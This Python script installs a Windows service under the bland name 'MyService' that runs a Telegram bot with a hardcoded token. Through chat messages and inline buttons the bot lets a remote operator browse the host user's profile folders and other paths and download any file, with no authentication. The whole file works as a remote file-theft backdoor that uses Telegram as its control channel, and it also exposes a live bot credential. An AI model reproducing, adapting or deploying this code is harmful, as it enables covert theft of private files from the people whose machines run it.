import win32serviceutil
import win32service
import win32event
import servicemanager
import socket
import os
import sys


class MyService(win32serviceutil.ServiceFramework):
    _svc_name_ = "MyService"
    _svc_display_name_ = "My Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        socket.setdefaulttimeout(60)
        self.is_alive = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_alive = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, ""),
        )
        self.main()

    def main(self):
        from aiogram import Dispatcher, Bot, executor, types
        import logging
        import dir_mr
        import os

        logging.basicConfig(level=logging.INFO)
        bot = Bot(token="6455554470:AAE9T0KHyeBaeJJsPbmWdu3aqnhhHhCAFMw")
        dp = Dispatcher(bot=bot)


        @dp.message_handler(commands=["start"])
        async def start(message: types.Message):
            lav = types.InlineKeyboardMarkup(row_width=1)
            # lan = types.InlineKeyboardMarkup(row_width=1)

            path = os.path.expandvars("%USERPROFILE%")

            # Получаем список файлов и директорий в указанном пути
            entries = os.listdir(path)
            # Выводим названия файлов и директорий на новых строках
            # print("Список файлов и директорий в {}:".format(path))
            for entry in entries:
                full_path = os.path.join(path, entry)
                if os.path.isdir(full_path):
                    d = types.InlineKeyboardButton(f"{entry}", callback_data=f"D{entry}")
                    lav.add(d)
                else:
                    # d = types.InlineKeyboardButton(f"'F' {entry}", callback_data=f"F")
                    await bot.send_message(
                        message.chat.id, f"<code>{entry}</code>", parse_mode="html"
                    )

                # lan.add(d)

            # lav = types.InlineKeyboardMarkup(row_width=1)
            # it = types.InlineKeyboardButton("Пополнить", callback_data='good')
            # lav.add(it)

            path = os.path.expandvars("%USERPROFILE%")
            await bot.send_message(message.chat.id, "HI GITLLER")
            await bot.send_message(
                message.chat.id, f"<code>{path}\</code>", reply_markup=lav, parse_mode="html"
            )
            # await bot.send_message(message.chat.id, path + "File", reply_markup=lan)


        ###########################################
        # ----------------Text---------------------#
        ###########################################
        @dp.message_handler(content_types=["text"])
        async def text(message):
            if message.chat.type == "private":
                a = message.text[-1]

                if a == "\\":
                    lav = types.InlineKeyboardMarkup(row_width=1)
                    # lan = types.InlineKeyboardMarkup(row_width=1)
                    text = message.text
                    path = os.path.expandvars(f"{text}")

                    # Получаем список файлов и директорий в указанном пути
                    entries = os.listdir(path)
                    # Выводим названия файлов и директорий на новых строках
                    # print("Список файлов и директорий в {}:".format(path))
                    for entry in entries:
                        full_path = os.path.join(path, entry)
                        if os.path.isdir(full_path):
                            d = types.InlineKeyboardButton(
                                f"{entry}", callback_data=f"D{entry}"
                            )
                            lav.add(d)
                        else:
                            # d = types.InlineKeyboardButton(f"'F' {entry}", callback_data=f"F")
                            await bot.send_message(
                                message.chat.id, f"<code>{entry}</code>", parse_mode="html"
                            )

                    path = os.path.expandvars(f"{text}")
                    await bot.send_message(message.chat.id, "HI GITLLER")
                    hop = await bot.send_message(
                        message.chat.id,
                        f"<code>{path}\</code>",
                        reply_markup=lav,
                        parse_mode="html",
                    )

                else:
                    file_path = message.text
                    with open(file_path, "rb") as file:
                        input_file = file
                        await bot.send_document(message.chat.id, input_file)
                    pass
                
                
        ################################################
        ############## ИНЛАЙНОВАЯ КЛАВИАТУРА ###########
        ################################################
        @dp.callback_query_handler(lambda query: True)
        async def callback_inline(call):
            if call.message:
                data = call.data
                data1 = data[:1]
                if data1 == "D":
                    button_text = data[1:]
                    mot = call.message.text
                    lav = types.InlineKeyboardMarkup(row_width=1)
                    # lan = types.InlineKeyboardMarkup(row_width=1)

                    path = os.path.expandvars(f"{mot}{button_text}")

                    # Получаем список файлов и директорий в указанном пути
                    entries = os.listdir(path)
                    # Выводим названия файлов и директорий на новых строках
                    # print("Список файлов и директорий в {}:".format(path))
                    for entry in entries:
                        full_path = os.path.join(path, entry)
                        if os.path.isdir(full_path):
                            d = types.InlineKeyboardButton(
                                f"{entry}", callback_data=f"D{entry}"
                            )
                            lav.add(d)
                        else:
                            # d = types.InlineKeyboardButton(f"'F' {entry}", callback_data=f"F")
                            await bot.send_message(
                                call.message.chat.id, f"<code>{entry}</code>", parse_mode="html"
                            )

                    path = os.path.expandvars(f"{mot}{button_text}")
                    await bot.send_message(call.message.chat.id, "HI GITLLER")
                    await bot.send_message(
                        call.message.chat.id,
                        f"<code>{path}\</code>",
                        reply_markup=lav,
                        parse_mode="html",
                    )
            # print(mot)

            # if call.data == "F":
            #     a = call.message.reply_markup.inline_keyboard
            #     print(a["text"])

            # if data1 == "F":
            #     button_text = data[1:]
            #     print(button_text)


        #################################################
        # ------------------Начало роботы----------------#
        #################################################
        try:
            if __name__ == "__main__":
                # print("Казино Бот запущен проблем нет")
                executor.start_polling(dp, skip_updates=True)
        except Exception as _ex:
            # print("Ошыбка!!!!!!!!!\n", _ex)

            pass


if __name__ == "__main__":
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(MyService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(MyService)
